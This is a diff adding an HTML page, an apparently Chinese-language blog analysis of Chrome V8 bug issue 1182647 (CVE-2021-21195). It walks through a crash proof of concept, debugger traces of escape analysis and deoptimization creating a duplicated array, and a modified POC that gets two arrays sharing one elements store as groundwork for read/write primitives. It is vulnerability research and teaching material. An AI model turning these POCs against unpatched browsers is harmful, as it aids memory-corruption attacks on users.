@@ -1,0 +1,178 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chrome漏洞分析与利用(十三)——issue-1182647(CVE 2021-21195)漏洞分析</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1><a id="POC_0"></a>POC</h1>
+<pre><code class="prism language-js"><span class="token keyword">let</span> s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span> 
+            <span class="token keyword">const</span> err_obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> p4nda<span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> arr<span class="token punctuation">}</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> e<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">25</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">var</span> ret <span class="token operator">=</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">p4nda</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Deopt here.</span>
+    s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">;</span>
+    arr<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>由于调用了gc函数，所以在使用d8执行时需要加上–expose-gc 参数，执行后。</p>
+<h1><a id="_32"></a>漏洞分析</h1>
+<h2><a id="_33"></a>调试</h2>
+<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1182647">issue 1182647</a><br>
+通过issue页面对漏洞的描述大致可知当在优化函数中发生错误时会去创建JSError对象，而在创建该对象的过程中会去调用<code>TranslatedValue:：GetValue</code>函数，该函数会通过寄存器以及堆栈中存储的信息生成一些对象，而当代码发生解优化时同样也会去调用<code>TranslatedValue:：GetValue</code>函数此时就会导致同样一个对象被创建了两次，对其中一个对象进行一些操作时，例如Array.prototype.shift。对另一个对象并不会产生影响，所以就会导致另一个对象指针悬留在旧内存空间。<br>
+对解优化JSArray对象调用Array.prototype.shift后，通过JSErro获取到保存在Function对象中的JSArray对象arr。<br>
+<img src="https://img-blog.csdnimg.cn/68c283b20d7a472593c2e84322084881.png" alt="在这里插入图片描述"><br>
+对解优化JSArray对象调用Array.prototype.shift后，解优化后的JSArray对象arr。<br>
+<img src="https://img-blog.csdnimg.cn/8c5c9aaa818f4708ab49791424948f5d.png" alt="在这里插入图片描述"><br>
+首次创建arr副本是在创建JSError对象过程中所调用的OptimizedFrame::Summarize函数中，该函数会打包发生错误的函数对象及其上下文。<br>
+<img src="https://img-blog.csdnimg.cn/51e869ef142c47569767fef431d24fd3.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/6b8f7dc7f2fc41bcbe6e18aea84545ef.png" alt="在这里插入图片描述"><br>
+通过function对象的context获取其上下文内容，并通过其上下文找到arr对象副本。<br>
+<img src="https://img-blog.csdnimg.cn/5f3c05597b5d417ea9a2fa8fd757c6ef.png" alt="在这里插入图片描述"><br>
+通过观察可以发现其对象地址为0x69082d2eb1，elements地址为0x690814eaf9<br>
+第二次创建arr对象是在poc代码执行到<code>/p4nda/.test({});</code>时触发解优化，此时会去调用Deoptimizer::MaterializeHeapObjects函数。<br>
+<img src="https://img-blog.csdnimg.cn/8fae752a139a4646ba24d3aa89056112.png" alt="在这里插入图片描述"><br>
+此时会直接取到函数的context，通过上下文可以获取到arr对象。<br>
+<img src="https://img-blog.csdnimg.cn/13c7f22c25fe42d2b799ba1871db07fd.png" alt="在这里插入图片描述"><br>
+此时arr对象地址为0x69082d3c61，而elements地址为0x690814eaf9，此时就得到了一个与JSError中arr对象使用相同elements的不同数组对象。<br>
+<img src="https://img-blog.csdnimg.cn/3afaead38ab346dcb4b1d5dc4e6f90dd.png" alt="在这里插入图片描述"><br>
+Array.prototype.shift函数会将数组中的第一个元素返回并删除，此操作会改变数组elements的长度并且会将其余数据向后移动。而此函数只会影响在Deoptimizer::MaterializeHeapObjects函数中生成arr对象，而保存在JSError对象中的arr对象则不会受影响此时JSError中的arr对象elements将会指向一个填充对象<br>
+<img src="https://img-blog.csdnimg.cn/d5199c85914a45538fd6dad9f2ffccba.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/878477eb67d64214a2473d83e2199a13.png" alt="在这里插入图片描述"><br>
+在第一次GC后可以发现JSError中创建的arr对象elements已经被释放<br>
+<img src="https://img-blog.csdnimg.cn/a89f885891e04748ad5eecf588a9e5da.png" alt="在这里插入图片描述"><br>
+当执行至第二次gc时会从arr elements取出map地址并从中获取数据，由于释放后的填充值并非一个合法的指针于是导致触发Crash<br>
+<img src="https://img-blog.csdnimg.cn/f498a7e65b114f178010394976de4c24.png" alt="在这里插入图片描述"><br>
+通过观察访问的地址可知该值位于arr对象map地址的+0x6偏移处，通过另一个在解优化过程中创建的arr对象map可知此偏移处为visitor_id字段<br>
+<img src="https://img-blog.csdnimg.cn/31734e8dbd804c0ca47ac3f8df52b3aa.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/c3e77d6759d040c3bccc98b2d760746f.png" alt="在这里插入图片描述"></p>
+<h2><a id="_62"></a>源码分析</h2>
+<h3><a id="_63"></a>逃逸分析</h3>
+<p>逃逸分析阶段对此漏洞有很大的影响，解优化的结果会直接影响到Summarize与MaterializeHeapObjects函数中是否会具体化某个对象，通过turbolizer图可以找到arr对象对应的Allocate节点：<br>
+<img src="https://img-blog.csdnimg.cn/cbd50b8c9e934e0f8e3339503e593298.png" alt="在这里插入图片描述"><br>
+而在执行过逃逸分析阶段后，此节点将会变成不可达节点：<br>
+<img src="https://img-blog.csdnimg.cn/b8d5279384b1451ebfbc3f5247818693.png" alt="在这里插入图片描述"><br>
+然后结合代码分析，在逃逸分析阶段对于Allocate节点会一律为该节点创建并初始化一个VirtualObject对象：<br>
+<img src="https://img-blog.csdnimg.cn/2bcc6abc3a8a46bfaaabb5fb4f7ca1d3.png" alt="在这里插入图片描述"><br>
+VirtualObject对象有两个函数：SetEscaped与HasEscaped，这两个函数一般用于设置与获取对象的逃逸状态，默认为非逃逸，而对象的逃逸状态将会决定节点是否会在逃逸分析阶段的最后被放松变得不可达，同时也决定着对象是否需要被具体化：<br>
+<img src="https://img-blog.csdnimg.cn/254de766b78b4242aca3a500ddb9a596.png" alt="在这里插入图片描述"><br>
+然后查看Allocate节点的所有output节点：<br>
+<img src="https://img-blog.csdnimg.cn/5bd02c47201447f3a2a76fe5d6c02b04.png" alt="在这里插入图片描述"><br>
+有Allocate节点的地方肯定会有FinishRegion节点，当遇到FinishRegion节点时会将自身节点的第一个输入节点的VirtualObject对象设为自身的VirtualObject对象，事实上通常FinishRegion节点的第一个输入都是是Allocate节点，此节点不会操作对象的逃逸状态：<br>
+<img src="https://img-blog.csdnimg.cn/6e1e8e3ea6eb405d882dea3ff2c2cb9f.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/5267b4d1c1c440a89e88ab72eff31d62.png" alt="在这里插入图片描述"><br>
+StoreField节点负责保存对象的各属性：<br>
+<img src="https://img-blog.csdnimg.cn/0e38887ae3c945109aba532d46a850db.png" alt="在这里插入图片描述"><br>
+当遇到StoreField节点时会获取第一和第二个输入节点，第一个输入通常是Allocate节点，第二个输入通常是要保存的内容例如elements地址，length等，随后判断其输入的Allocate节点的VirtualObject是否不为空以及是否还是未逃逸，当Vobject不为空且未逃逸就将StoreField节点标记为Dead，否则就将其对应的Allocate节点及其value设为逃逸：<br>
+<img src="https://img-blog.csdnimg.cn/a2f3db5f97ea4e79b537457911e1ad80.png" alt="在这里插入图片描述"><br>
+除此以外FinishRegion节点的output节点也会影响对象的逃逸状态，而在21195的原POC中FinishRegion只有一个StoreField节点，该节点用于将arr对象存入function对象context中，处理方式同上，所以对于21195的原POC arr对象将会是默认的非逃逸对象，而非逃逸对象会在逃逸分析阶段的最后被放松成为不可达节点：<br>
+<img src="https://img-blog.csdnimg.cn/329bf929e045405199a7ba4a2ca89943.png" alt="在这里插入图片描述"><br>
+除此以外非逃逸对象也会在解优化与Summarize函数中被具体化(重复构建)。</p>
+<h3><a id="Error_84"></a>Error对象构建</h3>
+<p>在构造Error对象时会通过栈追踪信息来遍历迭代器获取所有StackFrame，再根据不同类型的Frame去调用对应的Summarize函数：<br>
+<img src="https://img-blog.csdnimg.cn/92ede4f3e82a42abb2d520903d5f378b.png" alt="在这里插入图片描述"><br>
+当在迭代器中找到未优化函数时会调用UnoptimizedFrame::Summarize函数，该函数的function与receiver都是从内存缓存中直接获取的：<br>
+<img src="https://img-blog.csdnimg.cn/745c2555680d41cbab59050562e0b581.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/4bd1614519704c17a323313d0225a357.png" alt="在这里插入图片描述"><br>
+当在迭代器中找到优化函数后就会调用OptimizedFrame::Summarize函数，Summarize函数会初始化一个TranslatedState迭代器通过此迭代器先依次遍历获取栈中每个Frame的kind并进行比较当有满足条件的Frame时就继续执行获取对应的TranslatedValue对象：<br>
+<img src="https://img-blog.csdnimg.cn/94098321d9dd47f783c5f14f15d3eb36.png" alt="在这里插入图片描述"><br>
+按照我对TranslatedFrame的理解，每个TranslatedFrame对应一个FrameState节点，TranslatedFrame中保存的信息都是通过FrameState节点收集的。<br>
+随后通过TranslatedValue::GetValue函数具体化并返回对象或函数，google将此处视为一个正确性漏洞，在最新版的代码中已经在此处添加了CHECK进行检查，但在CVE 2021-21195的环境中不存在此CHECK：<br>
+<img src="https://img-blog.csdnimg.cn/d43f8f4e0c994448b55655f1b34abc08.png" alt="在这里插入图片描述"><br>
+TranslatedValue::GetValue函数会先判断Object是否是smi类型如果是就需要为其创建一个HeapNumber并返回，然后再判断Object是否是只读如果不是就直接返回<br>
+<img src="https://img-blog.csdnimg.cn/30ffb38936ec42a5a563503f36c053f3.png" alt="在这里插入图片描述"><br>
+如果以上两个分支都不满足并且Frame属于捕获或者重复对象时，就去具体化对象，当在处理function对象时还会将其上下文中的关联且未逃逸的对象也进行具体化，这其中就包括arr数组对象。<br>
+<img src="https://img-blog.csdnimg.cn/872fa85693b0438bb77c5dd68a803a1d.png" alt="在这里插入图片描述"><br>
+至此JSError中保存的arr对象创建完成</p>
+<h3><a id="_100"></a>解优化</h3>
+<p>在对JIT代码进行解优化时也会对所需的对象进行具体化，而arr就是所需对象之一，所以在该函数内arr对象会被再次创建一次<br>
+<img src="https://img-blog.csdnimg.cn/60a5675a174644dcb0ba38b37522a137.png" alt="在这里插入图片描述"></p>
+<h1><a id="_103"></a>漏洞利用</h1>
+<p>原版POC无法获取到Error对象中创建的arr对象，因为arr对象保存在function的context中，所以原POC是无法被利用的，但是可以在原POC的基础上进行一些微调：</p>
+<pre><code class="prism language-js"><span class="token comment">// --allow-natives-syntax --expose-gc </span>
+<span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token constant">C</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token constant">M</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token parameter">flg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">inlined_func</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> <span class="token constant">B</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token constant">B</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stack<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> p<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">25</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">inlined_func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span>
+    e<span class="token punctuation">.</span><span class="token constant">M</span> <span class="token operator">=</span> <span class="token function">inlined_func</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>flg<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">p4nda</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// deopt here</span>
+        arr<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// modify element in -*runtime*-</span>
+        e<span class="token punctuation">.</span><span class="token constant">C</span> <span class="token operator">=</span> arr<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">//print("------------------- run as builtin------------------");</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x3000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token comment">//print("------------------- run as jit------------------");</span>
+
+<span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token constant">M</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token constant">C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>通过这种方法就可以拿到两个地址不同但elements相同的arr数组对象：<br>
+<img src="https://img-blog.csdnimg.cn/f300e7df0894461094d0127fd9e28026.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/56300a0b49a1415eabfd833b85e59795.png" alt="在这里插入图片描述"><br>
+从目前的情况来看，就可以通过像cve 2022-1364那样在一个数组对象里删除元素填入hole然后再从另一个数组对象取出hole继续后续的利用步骤，但是需要注意的是此时的两个数组对象及其elements都是HOLEY_ELEMENTS此种类型的FixedArray在获取元素时有较为严苛的检查机制，这会导致我们拿不到hole，这一点可以从GetEntryForIndexImpl函数中看出，当elements类型是HOLEY时，在获取元素下标InternalIndex对象时，会先判断其index是否小于数组长度并且元素值不能为hole，如果这两个条件有一个不满足的话就会返回NotFound，实际上就是一个max值，而相反的如果elements不是HOLEY类型，就只是检查index是否小于数组长度：<br>
+<img src="https://img-blog.csdnimg.cn/649bcf26623d47f4a27017c27bad2895.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/0a07804a1dba49b1a96c553446f147e7.jpeg" alt="在这里插入图片描述"><br>
+所以现在需要将数组转化为PACKED_ELEMENTS类型，可以尝试对arr对象进行以下方式的初始化：</p>
+<pre><code class="prism language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+	<span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token operator">...</span><span class="token operator">...</span>
+<span class="token comment">//注释掉数组填充操作</span>
+<span class="token comment">//arr.fill({});</span>
+<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>理论上来讲只要元素足够就可以成功：<br>
+<img src="https://img-blog.csdnimg.cn/421ec03cc6584b1297761d36c93a8a4c.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/ea56ef72f822406fba4226b38d42b8ba.png" alt="在这里插入图片描述"><br>
+事实上从表面上看也确实是成功了，但是要注意的是此时elements虽然是PACKED_SMI_ELEMETS类型，但是有COW标记，COW是“写入时拷贝”的缩写，大致就是说当同一个资源/内存，被不同的对象所引用时就会将其标记为只读，当使用对象向其中写入或修改数据时就会创建一个新的副本返回给调用者并且保证原内容依然保持原样，所以当我们向上文中拿到的两个arr对象的其中一个写入或者删除数据时，这两个数组对象就会指向不同的elements最终导致我们无法达到目的。除此之外还尝试了其他很多关于将数组对象转换为PACKED数组的方法，但是基本上都会因为逃逸或者COW原因无法成功。<br>
+最后得出结论数组对象的各种检查机制过于苛刻在此处不可用该对象来进行利用，或许可能还有其他好的办法但我没有找到，现在还剩一个思路那就是更换其他对象，目前已知符合要求的对象就是arguments对象，但在此POC中直接使用arguments对象会导致arguments对象逃逸从而导致无法被具体化，但目前也没有找到其他合适的对象，所以最终采取直接套用CVE 2022-1364POC，在其原POC的基础上进行一些调整，在CVE 2022-1364原POC中获取到的两个指向同一elements的arguments对象都是在优化阶段通过创建Error对象时获得的，我们只需要让其获取一次，另一次在解优化后获取即可变成cve 2021-21195的漏洞触发流程，最后获取到hole后就可以进行读写原语的构造，最终效果：<br>
+<img src="https://img-blog.csdnimg.cn/61bf709308a24dea88dc1f0d53d7e2a5.gif" alt="在这里插入图片描述"></p>
+</div>
+</body>
+
+</html>
